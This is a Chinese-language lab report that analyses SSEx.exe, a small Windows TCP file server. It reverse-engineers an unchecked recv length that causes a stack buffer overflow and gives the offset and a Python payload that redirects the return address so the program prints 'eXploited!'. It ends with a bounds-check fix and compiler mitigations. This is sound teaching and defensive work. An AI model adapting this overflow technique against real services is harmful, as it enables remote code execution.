# SSEx.exe 漏洞机理分析与利用报告

## 1. 样本概况

- 文件：`SSEx.exe`
- 类型：PE32 executable (console) Intel 80386, for MS Windows
- 大小：9728 字节
- SHA-256：`17957f8536e92cc439b0669acb3175e0f4b63f44ae200f6c425f724063995287`
- ImageBase：`0x00400000`
- 入口点：`0x0040164E`
- 关键导入：`KERNEL32.dll`、`WS2_32.dll`、C 运行库

PE 头显示程序未启用 `DYNAMIC_BASE`、`NX_COMPAT`，且代码中没有使用 `/GS` 栈保护。

## 2. 程序行为

程序是一个 Windows 控制台 TCP 文件下载服务，监听 **192 端口**。

逆向出的主要逻辑如下：

```c
// 0x401290: main / listen loop 的主要部分
WSAStartup(0x202, &wsaData);
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
port = htons(0xC0);          // 192
bind(s, (SOCKADDR*)&addr, sizeof(addr));
listen(s, 5);
printf("listening on %d ...", 192);

while (1) {
    SOCKET client = accept(s, &addr, &addrlen);
    if (client != INVALID_SOCKET) {
        handle_client(client);   // 0x4010A0
        Sleep(10);
    }
}
```

`handle_client` 的关键反汇编片段位于 `0x004010A0`：

```asm
004010a0: push   ebp
004010a1: mov    ebp,esp
004010a3: sub    esp,0x110          ; 局部缓冲区 buf，大小 0x110 = 272 字节
...
004010e8: lea    ecx,[ebp-0x110]    ; buf
004010ef: push   ecx
004010f0: push   0x5                ; 接收 5 字节
004010f3: call   recv               ; recv(s, buf, 5, 0)
...
00401106: push   0x403158           ; "DOWN"
0040110b: lea    eax,[ebp-0x110]
00401111: push   eax
00401112: call   _stricmp
...
00401123: lea    ecx,[ebp-0x110]
0040112d: push   ecx
0040112e: push   0x4                ; 接收 4 字节长度
00401132: call   recv               ; recv(s, buf, 4, 0)
00401145: mov    eax,DWORD PTR [ebp-0x110]
0040114b: mov    [ebp-0x4],eax       ; n = *(DWORD*)buf
...
0040114e: mov    ecx,[ebp-0x4]
00401153: push   ecx                ; 使用攻击者控制的 n
00401154: lea    edx,[ebp-0x110]
0040115a: push   edx
0040115b: call   recv               ; recv(s, buf, n, 0)
00401168: lea    ecx,[ebp-0x110]
0040116e: mov    [0x404384],ecx      ; g_name = buf
...
0040118a: call   fopen              ; fopen(buf, "rb")
00401196: cmp    [ebp-0xc],0
0040119a: je     0x40127e           ; 打开失败则关闭 socket 并返回
```

正常下载完成后，程序会调用 `0x00401080`：

```asm
00401080: mov    eax,DWORD PTR [0x404384] ; g_name
00401085: push   eax
00401086: call   puts                      ; puts(g_name)
0040108c: add    esp,4
0040108f: push   0
00401091: call   exit
```

## 3. 漏洞定位

漏洞代码位于 `handle_client`，对应反汇编地址 `0x0040114E` 到 `0x0040115F`。

对应 C 代码形式为：

```c
char buf[0x110];

recv(s, buf, 5, 0);            // 接收 "DOWN"
recv(s, buf, 4, 0);            // 把前 4 字节当作长度 n
int n = *(int*)buf;
recv(s, buf, n, 0);            // 漏洞：n 未经边界检查
```

`buf` 的栈空间只有 `0x110` 字节，但 `recv` 的第三个参数 `n` 完全由客户端指定，程序没有检查：

```text
n <= 0 || n >= sizeof(buf)
```

因此可以向栈上写入超过 272 字节的数据，覆盖保存的 `EBP` 和函数返回地址。

## 4. 漏洞成因

1. **缺少输入长度校验**：客户端提供的 4 字节长度被直接作为 `recv` 长度使用。
2. **固定大小栈缓冲区**：`buf[0x110]` 位于栈上，`recv` 不负责边界保护。
3. **未启用缓解措施**：目标程序未启用栈 Cookie（`/GS`）、ASLR（`DYNAMIC_BASE`）和 DEP（`NX_COMPAT`），进一步降低了利用难度。
4. **协议设计缺陷**：长度字段与数据读取共用缓冲区，且后续 `fopen` 对字符串没有二次校验。

## 5. 成功利用：显示 `eXploited!`

### 5.1 利用思路

不需要注入新代码，也不需要修改 `SSEx.exe`。程序在接收文件名后、打开文件前，已经把缓冲区地址保存到全局变量：

```text
0x00404384 = g_name = buf
```

而 `0x00401080` 处的现有代码会执行：

```c
puts(g_name);
exit(0);
```

因此可以：

1. 让 `buf` 开头为 `"eXploited!\x00"`。
2. 用填充数据覆盖到返回地址。
3. 把返回地址改为 `0x00401080`。
4. 函数返回后，`0x00401080` 打印全局指针指向的字符串 `eXploited!`，然后退出。

### 5.2 偏移计算

```text
buf        = ebp - 0x110
saved ebp  = ebp + 0x000
saved ret  = ebp + 0x004
```

所以：

```text
return_address_offset = 0x110 + 4 = 0x114 = 276
```

### 5.3 攻击报文

1. 发送命令：`DOWN`
2. 发送 4 字节小端长度：`0x118`，即 `280`
3. 发送 280 字节 payload：

```python
cmd    = b"eXploited!\x00"          # 11 字节
filler = b"A" * 265                 # 11 + 265 = 276
ret    = struct.pack("<I", 0x00401080)
payload = cmd + filler + ret        # 280 字节
```

布局：

```text
偏移 0x000 .. 0x00A  : "eXploited!\x00"
偏移 0x00B .. 0x113  : "A" * 265
偏移 0x114 .. 0x117  : 80 10 40 00     ; 返回地址 0x00401080
```

当 `fopen("eXploited!", "rb")` 失败时，程序跳到 `0x0040127E` 关闭 socket，然后执行函数尾声并返回到 `0x00401080`，最终打印：

```text
eXploited!
```

### 5.4 实验截图

实验在 Windows 主机上运行，`SSEx.exe` 监听 192 端口，攻击脚本使用：

```powershell
python exploit_SSEx.py 127.0.0.1 192
```

攻击端输出为：

```text
[*] connecting to 127.0.0.1:192
[*] target closed the connection during payload delivery.
[+] check the SSEx.exe console: if it shows eXploited!, the exploit succeeded.
```

截图预留位置如下：

**截图 1：SSEx.exe 漏洞程序控制台显示 `eXploited!`**

> 【请在此处插入截图 1】

**截图 2：PowerShell 中运行 `exploit_SSEx.py` 的结果**

> 【请在此处插入截图 2】

## 6. 修复方法

最小修复是在读取长度后严格校验，并保证字符串结束符：

```c
char buf[0x110];
char cmd[6];
int n;

recv_all(s, cmd, 5);
cmd[5] = '\0';
if (_stricmp(cmd, "DOWN") != 0) {
    closesocket(s);
    return;
}

recv_all(s, (char*)&n, 4);
if (n <= 0 || n >= sizeof(buf)) {   // 关键边界检查
    closesocket(s);
    return;
}

recv_all(s, buf, n);
buf[n] = '\0';
```

同时建议：

- 将 `n` 按无符号整数处理，避免负数、整数溢出绕过检查。
- 封装 `recv_all`，处理 `recv` 的部分接收情况。
- 为文件名建立白名单或规范化路径，防止任意文件读取。
- 编译时启用 `/GS`、`/DYNAMICBASE`、`/NXCOMPAT`、`/SAFESEH`。

## 7. 结论

`SSEx.exe` 在 TCP 192 端口提供文件下载服务。其 `handle_client` 函数把攻击者控制的 4 字节长度直接传给 `recv`，写入固定 272 字节栈缓冲区，造成栈缓冲区溢出。利用现有 `0x00401080` 代码片段（`puts(g_name); exit(0)`）和全局指针 `0x00404384`，无需修改程序即可稳定打印 `eXploited!`。
